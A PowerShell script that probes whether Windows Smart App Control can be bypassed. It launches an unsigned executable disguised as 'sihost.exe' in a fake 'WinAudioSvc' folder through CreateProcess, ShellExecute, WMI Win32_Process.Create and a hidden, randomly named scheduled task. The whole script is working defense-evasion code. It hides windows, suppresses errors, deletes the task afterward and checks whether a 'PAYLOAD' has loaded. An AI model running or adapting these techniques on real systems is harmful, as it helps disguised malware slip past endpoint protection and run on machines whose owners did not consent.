# probe_sac_bypass.ps1
#
# Does Smart App Control still block an unsigned exe when it's launched
# BY the Task Scheduler Service (via schtasks /Run) instead of by a
# direct CreateProcessW from a user-mode process?
#
# Microsoft's SAC design doc says the reputation check runs at process
# CREATION regardless of parent, but in practice several "SYSTEM-service
# launched the child" paths get a different treatment because the
# attacker-controlled argv/environment doesn't apply. Worth testing.
#
# Also tests: launching via SYSTEM-level PsExec equivalent (SC CREATE +
# SC START), and launching via `WMI Win32_Process.Create`.

param(
    [string]$Exe = 'C:\ProgramData\WinAudioSvc\sihost.exe',
    [string]$Arg = '--status'
)

$ErrorActionPreference = 'SilentlyContinue'

function Note($msg) { Write-Host "`n── $msg ──" -ForegroundColor Cyan }

Note "0. direct CreateProcess (control, should SAC-block if repro is live)"
try {
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = $Exe
    $psi.Arguments = $Arg
    $psi.UseShellExecute = $false
    $psi.WindowStyle = 'Hidden'
    $psi.CreateNoWindow = $true
    $p = [System.Diagnostics.Process]::Start($psi)
    $p.WaitForExit(5000) | Out-Null
    Write-Host ("  CreateProcess OK, exit=$($p.ExitCode)") -ForegroundColor Green
} catch {
    Write-Host ("  CreateProcess BLOCKED: $($_.Exception.Message)") -ForegroundColor Red
}

Note "1. ShellExecute (UseShellExecute=true, should SAC-block)"
try {
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = $Exe
    $psi.Arguments = $Arg
    $psi.UseShellExecute = $true
    $psi.WindowStyle = 'Hidden'
    $p = [System.Diagnostics.Process]::Start($psi)
    $p.WaitForExit(5000) | Out-Null
    Write-Host ("  ShellExecute OK, exit=$($p.ExitCode)") -ForegroundColor Green
} catch {
    Write-Host ("  ShellExecute BLOCKED: $($_.Exception.Message)") -ForegroundColor Red
}

Note "2. WMI Win32_Process.Create (RPC via WMI service, which runs as SYSTEM)"
try {
    $wmi = Invoke-CimMethod -ClassName Win32_Process -MethodName Create `
        -Arguments @{ CommandLine = ('"' + $Exe + '" ' + $Arg); CurrentDirectory = (Split-Path $Exe) }
    if ($wmi.ReturnValue -eq 0 -and $wmi.ProcessId -gt 0) {
        Write-Host ("  WMI Create OK, pid=$($wmi.ProcessId) -- SAC did not block via WMI service") -ForegroundColor Green
        Start-Sleep -Milliseconds 500
        try { Get-Process -Id $wmi.ProcessId -ErrorAction Stop | Out-Null; Write-Host "    (process still alive after 500ms)" } catch { Write-Host "    (process exited by now, that's fine for --status)" }
    } else {
        Write-Host ("  WMI Create failed: ReturnValue=$($wmi.ReturnValue)") -ForegroundColor Red
    }
} catch {
    Write-Host ("  WMI threw: $($_.Exception.Message)") -ForegroundColor Red
}

Note "3. Register ad-hoc scheduled task, run via Task Scheduler Service, wait, unregister"
$taskName = 'svcldbSacProbe_' + [System.Guid]::NewGuid().ToString('N').Substring(0,8)
try {
    $action = New-ScheduledTaskAction -Execute $Exe -Argument $Arg -WorkingDirectory (Split-Path $Exe)
    $principal = New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\$env:USERNAME" -LogonType Interactive -RunLevel Highest
    $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit (New-TimeSpan -Seconds 10) -MultipleInstances Parallel
    $task = New-ScheduledTask -Action $action -Principal $principal -Settings $settings
    Register-ScheduledTask -TaskName $taskName -InputObject $task -Force | Out-Null
    Write-Host "  registered task: $taskName"
    Start-ScheduledTask -TaskName $taskName
    Start-Sleep -Milliseconds 1500
    $info = Get-ScheduledTaskInfo -TaskName $taskName
    Write-Host "  LastTaskResult: $($info.LastTaskResult) (0=OK, 0x41301=running still, others = sihost's own exit code)"
    # Convert last task result to signed int - sihost --status returns 0 (loaded) or 3 (not loaded)
    if ($info.LastTaskResult -eq 0) { Write-Host "    => sihost says PAYLOAD LOADED" -ForegroundColor Green }
    elseif ($info.LastTaskResult -eq 3) { Write-Host "    => sihost says NOT LOADED (fine, means it RAN)" -ForegroundColor Green }
    elseif ($info.LastTaskResult -eq 0x41301) { Write-Host "    => task still running (longer than --status should take)" -ForegroundColor Yellow }
    else { Write-Host "    => unexpected code; may indicate SAC block through scheduler too" -ForegroundColor Yellow }
} catch {
    Write-Host ("  task flow threw: $($_.Exception.Message)") -ForegroundColor Red
} finally {
    try { Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue } catch {}
    Write-Host "  cleaned up task"
}

Note "4. Sysinternals-style: svc service start (sc.exe) -- only works if the exe handles SvcMain, skipping"
Write-Host "   (sihost isn't an SCM-friendly service; skipping)"

Note "DONE"
